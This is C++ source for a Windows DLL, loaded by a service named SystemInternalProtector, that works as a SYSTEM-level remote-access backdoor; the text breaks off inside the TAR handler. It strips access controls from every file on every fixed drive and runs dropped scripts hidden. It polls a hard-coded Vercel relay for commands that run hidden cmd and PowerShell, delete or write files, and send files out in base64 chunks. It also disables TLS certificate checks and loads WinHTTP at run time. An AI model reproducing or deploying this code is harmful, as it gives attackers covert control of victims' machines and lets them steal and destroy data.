// ============================================================================
//  meow.dll — SYSTEM component (v0.4.0)
//  Loaded by the SystemInternalProtector service (SYSTEM context, boot).
//
//  Exports:
//    meow_init()      service host entry: privileges, marker, ACL pass,
//                     task watchdog, relay agent thread (succubus control)
//    meow_access(path, recursive)   grant unrestricted access to a path
//    meow_run(cmdline, wait_ms)     hidden command/script execution
//    meow_agent_once()              run one relay poll cycle (test/drive)
//    meow_config(server, channel)   set relay config (writes config.json)
//
//  Relay verbs (command = VERB|arg1|arg2...):
//    LIST|path         -> directory listing (hidden/system included)
//    MKDIR|path        -> create directory
//    DEL|path          -> delete file or directory tree
//    GET|path          -> file as base64 chunks (result stream)
//    PUT|path|append|b64data  -> write file (chunked)
//    TAR|dir|tarfile   -> package directory with tar.exe
//    RUNCMD|cmd        -> hidden cmd execution (as SYSTEM)
//    RUNPS|script      -> hidden powershell execution
//
//  Config: C:\ProgramData\SVOnline\config.json  {server, channel, poll_ms}
//  Build:  cl /nologo /LD /EHsc /O2 /utf-8 /W4 /wd4996 meow.cpp advapi32.lib /Fe:meow.dll
// ============================================================================
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <aclapi.h>
#include <sddl.h>

#include <atomic>
#include <cstdio>
#include <string>
#include <thread>
#include <vector>

static volatile LONG g_walkActive = 0;
static volatile LONG g_runSeq = 0;

static void logLine(const wchar_t* msg);  // defined below

// ----------------------------------------------------------------------------
// paths
// ----------------------------------------------------------------------------
static std::wstring svonlineDir() {
    wchar_t pd[MAX_PATH]{};
    DWORD dn = GetEnvironmentVariableW(L"PROGRAMDATA", pd, MAX_PATH);
    return (dn && dn < MAX_PATH ? std::wstring(pd) : std::wstring(L"C:\\ProgramData"))
           + L"\\SVOnline";
}

static std::wstring toWide(const std::string& s) {
    std::wstring w(s.size(), L'\0');
    for (size_t i = 0; i < s.size(); ++i) w[i] = static_cast<unsigned char>(s[i]);
    return w;
}

static std::string toNarrow(const std::wstring& w) {
    std::string s(w.size(), '\0');
    for (size_t i = 0; i < w.size(); ++i) s[i] = static_cast<char>(w[i] & 0x7f);
    return s;
}

// ----------------------------------------------------------------------------
// logging (append-only, failure tolerant)
// ----------------------------------------------------------------------------
static void logLine(const wchar_t* msg) {
    std::wstring path = svonlineDir() + L"\\meow.log";
    HANDLE h = CreateFileW(path.c_str(), FILE_APPEND_DATA,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                           OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return;
    SYSTEMTIME st{};
    GetLocalTime(&st);
    char buf[640]{};
    int n = std::sprintf(buf, "[%02u-%02u %02u:%02u:%02u] %S\n",
                         st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, msg);
    if (n > 0) {
        DWORD wr = 0;
        WriteFile(h, buf, static_cast<DWORD>(n), &wr, nullptr);
    }
    CloseHandle(h);
}

// ----------------------------------------------------------------------------
// privileges
// ----------------------------------------------------------------------------
static bool enablePrivilege(const wchar_t* name) {
    HANDLE hTok = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok))
        return false;
    LUID luid{};
    bool ok = false;
    if (LookupPrivilegeValueW(nullptr, name, &luid)) {
        TOKEN_PRIVILEGES tp{};
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hTok, FALSE, &tp, 0, nullptr, nullptr);
        ok = (GetLastError() == ERROR_SUCCESS);
    }
    CloseHandle(hTok);
    return ok;
}

static PSID systemSid() {
    static BYTE buf[SECURITY_MAX_SID_SIZE];
    DWORD sz = sizeof(buf);
    return CreateWellKnownSid(WinLocalSystemSid, nullptr, buf, &sz) ? buf : nullptr;
}

// ----------------------------------------------------------------------------
// grant: owner -> SYSTEM, DACL removed (null DACL = unrestricted access)
// ----------------------------------------------------------------------------
static DWORD grantFullControl(const std::wstring& path) {
    PSID owner = systemSid();
    if (!owner) return ERROR_GEN_FAILURE;
    return SetNamedSecurityInfoW(const_cast<wchar_t*>(path.c_str()), SE_FILE_OBJECT,
                                 OWNER_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION |
                                     PROTECTED_DACL_SECURITY_INFORMATION,
                                 owner, nullptr, nullptr, nullptr);
}

// ----------------------------------------------------------------------------
// recursive walk (ACL pass + delete helper)
// ----------------------------------------------------------------------------
struct WalkState {
    ULONGLONG processed = 0;
    ULONGLONG failed = 0;
};

static void walk(const std::wstring& dir, WalkState& st, int depth) {
    if (depth > 64) return;
    std::wstring pattern = dir + L"\\*";
    WIN32_FIND_DATAW fd{};
    HANDLE h = FindFirstFileW(pattern.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;
        std::wstring full = dir + L"\\" + fd.cFileName;
        DWORD err = grantFullControl(full);
        ++st.processed;
        if (err != ERROR_SUCCESS) ++st.failed;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) walk(full, st, depth + 1);
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}

static bool deleteTree(const std::wstring& path) {
    WIN32_FIND_DATAW fd{};
    std::wstring pattern = path + L"\\*";
    HANDLE h = FindFirstFileW(pattern.c_str(), &fd);
    if (h != INVALID_HANDLE_VALUE) {
        do {
            if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
            std::wstring full = path + L"\\" + fd.cFileName;
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (!deleteTree(full)) { FindClose(h); return false; }
            } else if (!DeleteFileW(full.c_str())) {
                SetFileAttributesW(full.c_str(), FILE_ATTRIBUTE_NORMAL);
                DeleteFileW(full.c_str());
            }
        } while (FindNextFileW(h, &fd));
        FindClose(h);
    }
    if (!RemoveDirectoryW(path.c_str())) {
        SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_NORMAL);
        RemoveDirectoryW(path.c_str());
    }
    return GetFileAttributesW(path.c_str()) == INVALID_FILE_ATTRIBUTES;
}

// ----------------------------------------------------------------------------
// boot pass: every fixed drive, background thread
// ----------------------------------------------------------------------------
static void bootPass() {
    DWORD mask = GetLogicalDrives();
    for (int i = 0; i < 26; ++i) {
        if (!(mask & (1u << i))) continue;
        wchar_t root[4] = { static_cast<wchar_t>(L'A' + i), L':', L'\\', 0 };
        if (GetDriveTypeW(root) != DRIVE_FIXED) continue;
        WalkState st;
        logLine((std::wstring(L"drive walk start: ") + root).c_str());
        grantFullControl(std::wstring(root));
        walk(root, st, 1);
        logLine((std::wstring(L"drive walk done: ") + root + L" processed=" +
                 std::to_wstring(st.processed) + L" failed=" + std::to_wstring(st.failed))
                    .c_str());
    }
    InterlockedExchange(&g_walkActive, 0);
}

// ----------------------------------------------------------------------------
// hidden execution engine (CREATE_NO_WINDOW, no console, SYSTEM context)
// ----------------------------------------------------------------------------
static std::wstring scriptPrefix(const std::wstring& cmd) {
    std::wstring low = cmd;
    for (auto& c : low) if (c >= L'A' && c <= L'Z') c += 32;
    if (low.find(L".cmd") != std::wstring::npos || low.find(L".bat") != std::wstring::npos)
        return L"cmd.exe /c ";
    if (low.find(L".ps1") != std::wstring::npos)
        return L"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ";
    return L"";
}

static int runHidden(const std::wstring& cmdline, const std::wstring& outFile, DWORD waitMs) {
    std::vector<wchar_t> cmd(cmdline.begin(), cmdline.end());
    cmd.push_back(0);
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    HANDLE hOut = INVALID_HANDLE_VALUE;
    if (!outFile.empty()) {
        hOut = CreateFileW(outFile.c_str(), FILE_APPEND_DATA,
                           FILE_SHARE_READ | FILE_SHARE_WRITE, &sa,
                           OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    }
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    if (hOut != INVALID_HANDLE_VALUE) {
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = hOut;
        si.hStdError = hOut;
        si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    }
    PROCESS_INFORMATION pi{};
    if (!CreateProcessW(nullptr, cmd.data(), nullptr, nullptr, TRUE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        if (hOut != INVALID_HANDLE_VALUE) CloseHandle(hOut);
        return -1;
    }
    if (hOut != INVALID_HANDLE_VALUE) CloseHandle(hOut);
    if (waitMs == 0) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 0;
    }
    if (WaitForSingleObject(pi.hProcess, waitMs) == WAIT_TIMEOUT) {
        TerminateProcess(pi.hProcess, 1);
        WaitForSingleObject(pi.hProcess, 5000);
    }
    DWORD code = 0;
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return static_cast<int>(code);
}

static int runHiddenCapture(const std::wstring& cmdline, std::string& output, DWORD waitMs = 120000) {
    wchar_t tmp[MAX_PATH]{};
    GetTempPathW(MAX_PATH, tmp);
    std::wstring outFile = std::wstring(tmp) + L"meowcap.tmp";
    int code = runHidden(cmdline, outFile, waitMs);
    HANDLE h = CreateFileW(outFile.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD sz = GetFileSize(h, nullptr);
        if (sz > 0 && sz < 4 * 1024 * 1024) {
            output.resize(sz);
            DWORD rd = 0;
            ReadFile(h, output.data(), sz, &rd, nullptr);
            output.resize(rd);
        }
        CloseHandle(h);
    }
    DeleteFileW(outFile.c_str());
    return code;
}

// ----------------------------------------------------------------------------
// drop-folder watchdog: SVOnline\tasks -> hidden run -> .done + results
// ----------------------------------------------------------------------------
static void watchTasks() {
    std::wstring dir = svonlineDir() + L"\\tasks";
    std::wstring resDir = svonlineDir() + L"\\results";
    CreateDirectoryW(dir.c_str(), nullptr);
    CreateDirectoryW(resDir.c_str(), nullptr);
    for (;;) {
        Sleep(2000);
        std::wstring pattern = dir + L"\\*";
        WIN32_FIND_DATAW fd{};
        HANDLE h = FindFirstFileW(pattern.c_str(), &fd);
        if (h == INVALID_HANDLE_VALUE) continue;
        std::vector<std::wstring> jobs;
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
            std::wstring low = fd.cFileName;
            for (auto& c : low) if (c >= L'A' && c <= L'Z') c += 32;
            if (low.find(L".cmd") != std::wstring::npos ||
                low.find(L".bat") != std::wstring::npos ||
                low.find(L".ps1") != std::wstring::npos) {
                jobs.push_back(dir + L"\\" + fd.cFileName);
            }
        } while (FindNextFileW(h, &fd));
        FindClose(h);
        for (const auto& job : jobs) {
            std::wstring full = scriptPrefix(job) + job;
            std::wstring base = job;
            auto dot = base.find_last_of(L'.');
            if (dot != std::wstring::npos) base = base.substr(0, dot);
            auto sep = base.find_last_of(L'\\');
            std::wstring outName = resDir + L"\\"
                + (sep == std::wstring::npos ? base : base.substr(sep + 1)) + L".out";
            int code = runHidden(full, outName, 0);
            logLine((L"task: " + job + L" exit=" + std::to_wstring(code)).c_str());
            MoveFileExW(job.c_str(), (job + L".done").c_str(), MOVEFILE_REPLACE_EXISTING);
        }
    }
}

// ----------------------------------------------------------------------------
// minimal JSON helpers (escape / extract)
// ----------------------------------------------------------------------------
static std::string jsonEscape(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 16);
    for (char c : s) {
        if (c == '\\' || c == '"') { out += '\\'; out += c; }
        else if (c == '\n') out += "\\n";
        else if (c == '\r') out += "\\r";
        else if (c == '\t') out += "\\t";
        else if (static_cast<unsigned char>(c) < 0x20) {
            char b[8];
            std::sprintf(b, "\\u%04x", c);
            out += b;
        }
        else out += c;
    }
    return out;
}

static bool jsonStringAt(const std::string& s, size_t i, std::string& out) {
    if (i >= s.size() || s[i] != '"') return false;
    ++i;
    out.clear();
    while (i < s.size()) {
        char c = s[i];
        if (c == '"') return true;
        if (c == '\\' && i + 1 < s.size()) {
            char e = s[i + 1];
            if (e == '"' || e == '\\' || e == '/') out += e;
            else if (e == 'n') out += '\n';
            else if (e == 'r') out += '\r';
            else if (e == 't') out += '\t';
            else if (e == 'u' && i + 5 < s.size()) {
                int v = 0;
                for (int k = 1; k <= 4; ++k) {
                    char h = s[i + 1 + k];
                    v <<= 4;
                    if (h >= '0' && h <= '9') v |= h - '0';
                    else if (h >= 'a' && h <= 'f') v |= h - 'a' + 10;
                    else if (h >= 'A' && h <= 'F') v |= h - 'A' + 10;
                }
                out += static_cast<char>(v > 0x7f ? '?' : v);
                i += 4;
            }
            i += 2;
        } else {
            out += c;
            ++i;
        }
    }
    return false;
}

static bool findKey(const std::string& s, const char* key, std::string& out, size_t from = 0) {
    std::string k = std::string("\"") + key + "\":";
    size_t p = s.find(k, from);
    if (p == std::string::npos) return false;
    p += k.size();
    while (p < s.size() && (s[p] == ' ' || s[p] == '\t')) ++p;
    return jsonStringAt(s, p, out);
}

// ----------------------------------------------------------------------------
// base64
// ----------------------------------------------------------------------------
static const char B64T[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static std::string b64Encode(const char* data, size_t len) {
    std::string out;
    out.reserve(((len + 2) / 3) * 4);
    size_t i = 0;
    while (i + 3 <= len) {
        unsigned v = (unsigned char)data[i] << 16 | (unsigned char)data[i + 1] << 8 | (unsigned char)data[i + 2];
        out += B64T[(v >> 18) & 63];
        out += B64T[(v >> 12) & 63];
        out += B64T[(v >> 6) & 63];
        out += B64T[v & 63];
        i += 3;
    }
    size_t rem = len - i;
    if (rem == 1) {
        unsigned v = (unsigned char)data[i] << 16;
        out += B64T[(v >> 18) & 63];
        out += B64T[(v >> 12) & 63];
        out += "==";
    } else if (rem == 2) {
        unsigned v = (unsigned char)data[i] << 16 | (unsigned char)data[i + 1] << 8;
        out += B64T[(v >> 18) & 63];
        out += B64T[(v >> 12) & 63];
        out += B64T[(v >> 6) & 63];
        out += '=';
    }
    return out;
}

static int b64Val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static std::string b64Decode(const std::string& s, size_t& outLen) {
    std::string out;
    out.reserve(s.size() / 4 * 3 + 3);
    int buf = 0, bits = 0;
    for (char c : s) {
        if (c == '=' || c == '\r' || c == '\n' || c == ' ') continue;
        int v = b64Val(c);
        if (v < 0) continue;
        buf = (buf << 6) | v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out += static_cast<char>((buf >> bits) & 0xff);
        }
    }
    outLen = out.size();
    return out;
}

// ----------------------------------------------------------------------------
// relay HTTP (WinHTTP, dynamically loaded - no static import)
// ----------------------------------------------------------------------------
struct WinHttpApi {
    HINTERNET(WINAPI* open)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD) = nullptr;
    HINTERNET(WINAPI* connect)(HINTERNET, LPCWSTR, INTERNET_PORT, LPCWSTR, LPCWSTR, LPCWSTR, DWORD) = nullptr;
    HINTERNET(WINAPI* openReq)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD, DWORD_PTR) = nullptr;
    BOOL(WINAPI* sendReq)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR) = nullptr;
    BOOL(WINAPI* readData)(HINTERNET, LPVOID, DWORD, LPDWORD) = nullptr;
    BOOL(WINAPI* setOption)(HINTERNET, DWORD, LPVOID, DWORD) = nullptr;
    BOOL(WINAPI* close)(HINTERNET) = nullptr;
};
static WinHttpApi wh;

static bool loadWinHttp() {
    if (wh.open) return true;
    HMODULE h = LoadLibraryW(L"winhttp.dll");
    if (!h) return false;
    wh.open = (HINTERNET(WINAPI*)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD))GetProcAddress(h, "WinHttpOpen");
    wh.connect = (HINTERNET(WINAPI*)(HINTERNET, LPCWSTR, INTERNET_PORT, LPCWSTR, LPCWSTR, LPCWSTR, DWORD))GetProcAddress(h, "WinHttpConnect");
    wh.openReq = (HINTERNET(WINAPI*)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD, DWORD_PTR))GetProcAddress(h, "WinHttpOpenRequest");
    wh.sendReq = (BOOL(WINAPI*)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR))GetProcAddress(h, "WinHttpSendRequest");
    wh.readData = (BOOL(WINAPI*)(HINTERNET, LPVOID, DWORD, LPDWORD))GetProcAddress(h, "WinHttpReadData");
    wh.setOption = (BOOL(WINAPI*)(HINTERNET, DWORD, LPVOID, DWORD))GetProcAddress(h, "WinHttpSetOption");
    wh.close = (BOOL(WINAPI*)(HINTERNET))GetProcAddress(h, "WinHttpCloseHandle");
    return wh.open && wh.connect && wh.openReq && wh.sendReq && wh.readData && wh.close;
}

static bool httpJson(const std::string& method, const std::string& url, const std::string& body, std::string& out) {
    if (!loadWinHttp()) return false;
    std::string rest;
    bool secure = false;
    if (url.rfind("https://", 0) == 0) { secure = true; rest = url.substr(8); }
    else if (url.rfind("http://", 0) == 0) rest = url.substr(7);
    else return false;
    size_t slash = rest.find('/');
    std::string hostPort = slash == std::string::npos ? rest : rest.substr(0, slash);
    std::string path = slash == std::string::npos ? "/" : rest.substr(slash);
    std::wstring hostW = toWide(hostPort);
    INTERNET_PORT port = secure ? 443 : 80;
    size_t colon = hostPort.rfind(':');
    if (colon != std::string::npos) {
        port = static_cast<INTERNET_PORT>(std::atoi(hostPort.c_str() + colon + 1));
        hostW = toWide(hostPort.substr(0, colon));
    }
    HINTERNET hI = wh.open(L"SVOnline", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);
    if (!hI) return false;
    HINTERNET hC = wh.connect(hI, hostW.c_str(), port, nullptr, nullptr, nullptr, 0);
    if (!hC) { wh.close(hI); return false; }
    DWORD flags = secure ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hR = wh.openReq(hC, toWide(method).c_str(), toWide(path).c_str(),
                              nullptr, nullptr, nullptr, flags, 0);
    if (!hR) { wh.close(hC); wh.close(hI); return false; }
    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    wh.setOption(hR, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
    LPCWSTR hdrs = body.empty() ? nullptr : L"Content-Type: application/json\r\n";
    BOOL ok = wh.sendReq(hR, hdrs, static_cast<DWORD>(-1),
                         body.empty() ? nullptr : reinterpret_cast<LPVOID>(const_cast<char*>(body.data())),
                         static_cast<DWORD>(body.size()), 0, 0);
    if (!ok) { wh.close(hR); wh.close(hC); wh.close(hI); return false; }
    out.clear();
    char buf[16384];
    DWORD rd = 0;
    while (wh.readData(hR, buf, sizeof(buf), &rd) && rd > 0) {
        out.append(buf, rd);
        rd = 0;
    }
    wh.close(hR);
    wh.close(hC);
    wh.close(hI);
    return true;
}

// ----------------------------------------------------------------------------
// relay agent (succubus control)
// ----------------------------------------------------------------------------
static const size_t CHUNK_RAW = 1 * 1024 * 1024;  // 1MB raw per chunk

struct AgentCfg {
    std::string server;
    std::string channel;
    int poll_ms = 2000;
};

static std::string urlEncode(const std::string& s) {
    std::string out;
    char buf[8];
    for (char c : s) {
        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') ||
            c == '-' || c == '_' || c == '.') {
            out += c;
        } else {
            std::sprintf(buf, "%%%02X", static_cast<unsigned char>(c));
            out += buf;
        }
    }
    return out;
}

static AgentCfg loadConfig() {
    AgentCfg cfg;
    cfg.server = "https://excited-darwin.vercel.app";
    cfg.channel = "succubus";
    std::wstring path = svonlineDir() + L"\\config.json";
    HANDLE h = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD sz = GetFileSize(h, nullptr);
        if (sz > 0 && sz < 65536) {
            std::string buf(sz, '\0');
            DWORD rd = 0;
            ReadFile(h, buf.data(), sz, &rd, nullptr);
            std::string v;
            if (findKey(buf, "server", v)) cfg.server = v;
            if (findKey(buf, "channel", v)) cfg.channel = v;
            if (findKey(buf, "poll_ms", v)) cfg.poll_ms = std::atoi(v.c_str());
            if (cfg.poll_ms < 500) cfg.poll_ms = 500;
        }
        CloseHandle(h);
    }
    return cfg;
}

static void saveConfig(const std::string& server, const std::string& channel) {
    std::wstring path = svonlineDir() + L"\\config.json";
    std::string json = "{\"server\":\"" + jsonEscape(server) + "\",\"channel\":\"" +
                       jsonEscape(channel) + "\",\"poll_ms\":2000}";
    HANDLE h = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD wr = 0;
        WriteFile(h, json.data(), static_cast<DWORD>(json.size()), &wr, nullptr);
        CloseHandle(h);
    }
}

struct CmdMsg {
    std::string id;
    std::string command;
};

static std::vector<CmdMsg> parseCommands(const std::string& json) {
    std::vector<CmdMsg> out;
    size_t i = 0;
    while ((i = json.find("\"command\":", i)) != std::string::npos) {
        CmdMsg m;
        size_t p = i + 10;
        while (p < json.size() && (json[p] == ' ' || json[p] == '\t')) ++p;
        if (!jsonStringAt(json, p, m.command)) { i += 10; continue; }
        size_t prev = json.rfind("\"id\":", i);
        if (prev != std::string::npos) {
            size_t p2 = prev + 5;
            while (p2 < json.size() && (json[p2] == ' ' || json[p2] == '\t')) ++p2;
            jsonStringAt(json, p2, m.id);
        }
        out.push_back(m);
        i = p + m.command.size();
    }
    return out;
}

static bool postResult(const AgentCfg& cfg, const std::string& body) {
    std::string resp;
    std::string url = cfg.server + "/api/result";
    return httpJson("POST", url, body, resp);
}

static void postResultMsg(const AgentCfg& cfg, const CmdMsg& cmd, const std::string& verb,
                          int exitCode, const std::string& message,
                          const std::string& data = "", int chunkI = 0, int chunkN = 0) {
    std::string body = "{\"channel\":\"" + jsonEscape(cfg.channel) +
                       "\",\"sender\":\"meow\",\"result\":{\"id\":\"" + jsonEscape(cmd.id) +
                       "\",\"verb\":\"" + verb +
                       "\",\"exit\":" + std::to_string(exitCode) +
                       ",\"message\":\"" + jsonEscape(message) +
                       "\",\"chunk_i\":" + std::to_string(chunkI) +
                       ",\"chunk_n\":" + std::to_string(chunkN) +
                       ",\"data\":\"" + data + "\"}}";
    postResult(cfg, body);
}

static void dispatchCmd(const AgentCfg& cfg, const CmdMsg& cmd) {
    const std::string& c = cmd.command;
    size_t p = c.find('|');
    std::string verb = p == std::string::npos ? c : c.substr(0, p);
    std::string rest = p == std::string::npos ? "" : c.substr(p + 1);
    for (auto& ch : verb) if (ch >= 'a' && ch <= 'z') ch -= 32;
    std::wstring wrest = toWide(rest);

    if (verb == "RUNCMD") {
        int code = runHidden(wrest, L"", 120000);
        postResultMsg(cfg, cmd, "RUNCMD", code, "done");
        return;
    }
    if (verb == "RUNPS") {
        std::wstring full = L"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " + wrest;
        int code = runHidden(full, L"", 180000);
        postResultMsg(cfg, cmd, "RUNPS", code, "done");
        return;
    }
    if (verb == "MKDIR") {
        if (rest.empty()) { postResultMsg(cfg, cmd, "MKDIR", 1, "no path"); return; }
        BOOL ok = CreateDirectoryW(wrest.c_str(), nullptr);
        if (!ok && GetLastError() == ERROR_ALREADY_EXISTS) ok = TRUE;
        postResultMsg(cfg, cmd, "MKDIR", ok ? 0 : (int)GetLastError(), ok ? "created" : "failed");
        return;
    }
    if (verb == "DEL") {
        if (rest.empty()) { postResultMsg(cfg, cmd, "DEL", 1, "no path"); return; }
        bool ok = false;
        if (GetFileAttributesW(wrest.c_str()) & FILE_ATTRIBUTE_DIRECTORY) ok = deleteTree(wrest);
        else ok = DeleteFileW(wrest.c_str()) != FALSE;
        postResultMsg(cfg, cmd, "DEL", ok ? 0 : (int)GetLastError(), ok ? "deleted" : "failed");
        return;
    }
    if (verb == "LIST") {
        if (rest.empty()) { postResultMsg(cfg, cmd, "LIST", 1, "no path"); return; }
        std::wstring dir = wrest;
        std::wstring pattern = dir + L"\\*";
        WIN32_FIND_DATAW fd{};
        HANDLE h = FindFirstFileW(pattern.c_str(), &fd);
        if (h == INVALID_HANDLE_VALUE) {
            postResultMsg(cfg, cmd, "LIST", (int)GetLastError(), "cannot open");
            return;
        }
        std::string entries;
        entries += "[";
        bool first = true;
        do {
            if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
            bool isDir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
            bool hidden = (fd.dwFileAttributes & (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) != 0;
            if (!first) entries += ",";
            first = false;
            entries += "{\"n\":\"" + jsonEscape(toNarrow(fd.cFileName)) + "\",\"t\":\"" +
                       (isDir ? "d" : "f") + "\",\"h\":" + (hidden ? "1" : "0") +
                       ",\"s\":" + std::to_string(
                           (isDir || fd.nFileSizeHigh) ? 0ULL :
                           ((unsigned long long)fd.nFileSizeHigh << 32) | fd.nFileSizeLow) + "}";
        } while (FindNextFileW(h, &fd));
        FindClose(h);
        entries += "]";
        std::string body = "{\"channel\":\"" + jsonEscape(cfg.channel) +
                           "\",\"sender\":\"meow\",\"result\":{\"id\":\"" + jsonEscape(cmd.id) +
                           "\",\"verb\":\"LIST\",\"exit\":0,\"message\":\"ok\"," +
                           "\"chunk_i\":0,\"chunk_n\":0,\"data\":\"\",\"entries\":" + entries + "}}";
        postResult(cfg, body);
        return;
    }
    if (verb == "GET") {
        if (rest.empty()) { postResultMsg(cfg, cmd, "GET", 1, "no path"); return; }
        HANDLE h = CreateFileW(wrest.c_str(), GENERIC_READ,
                               FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                               nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h == INVALID_HANDLE_VALUE) {
            postResultMsg(cfg, cmd, "GET", (int)GetLastError(), "cannot open");
            return;
        }
        LARGE_INTEGER sz{};
        GetFileSizeEx(h, &sz);
        if (sz.QuadPart > 256LL * 1024 * 1024) {
            CloseHandle(h);
            postResultMsg(cfg, cmd, "GET", 1, "file too large");
            return;
        }
        std::string file(static_cast<size_t>(sz.QuadPart), '\0');
        DWORD totalRead = 0;
        while (totalRead < file.size()) {
            DWORD rd = 0;
            if (!ReadFile(h, file.data() + totalRead, static_cast<DWORD>(file.size() - totalRead), &rd, nullptr) || rd == 0) break;
            totalRead += rd;
        }
        CloseHandle(h);
        file.resize(totalRead);
        size_t chunks = (file.size() + CHUNK_RAW - 1) / CHUNK_RAW;
        if (chunks == 0) chunks = 1;
        for (size_t i = 0; i < chunks; ++i) {
            size_t off = i * CHUNK_RAW;
            size_t len = file.size() - off;
            if (len > CHUNK_RAW) len = CHUNK_RAW;
            std::string b64 = b64Encode(file.data() + off, len);
            postResultMsg(cfg, cmd, "GET", 0, "chunk",
                          b64, static_cast<int>(i), static_cast<int>(chunks));
        }
        logLine((L"GET served: " + wrest + L" (" + std::to_wstring(file.size()) + L" bytes, " +
                 std::to_wstring(chunks) + L" chunks)").c_str());
        return;
    }
    if (verb == "PUT") {
        // PUT|path|append|data
        size_t p1 = rest.find('|');
        if (p1 == std::string::npos) { postResultMsg(cfg, cmd, "PUT", 1, "bad args"); return; }
        size_t p2 = rest.find('|', p1 + 1);
        std::wstring path = toWide(rest.substr(0, p1));
        bool append = false;
        std::string data;
        if (p2 == std::string::npos) {
            data = rest.substr(p1 + 1);
        } else {
            append = rest.substr(p1 + 1, p2 - p1 - 1) == "1";
            data = rest.substr(p2 + 1);
        }
        if (path.empty()) { postResultMsg(cfg, cmd, "PUT", 1, "no path"); return; }
        size_t outLen = 0;
        std::string raw = b64Decode(data, outLen);
        HANDLE h = CreateFileW(path.c_str(), FILE_APPEND_DATA | (append ? 0 : GENERIC_WRITE),
                               FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                               append ? OPEN_ALWAYS : CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL, nullptr);
        if (h == INVALID_HANDLE_VALUE) {
            postResultMsg(cfg, cmd, "PUT", (int)GetLastError(), "cannot create");
            return;
        }
        if (append) SetFilePointer(h, 0, nullptr, FILE_END);
        DWORD wr = 0;
        BOOL ok = WriteFile(h, raw.data(), static_cast<DWORD>(outLen), &wr, nullptr);
        CloseHandle(h);
        postResultMsg(cfg, cmd, "PUT", ok ? 0 : (int)GetLastError(), ok ? "written" : "failed");
        return;
    }
    if (verb == "TAR") {
        size_t p1 = rest.find('|');
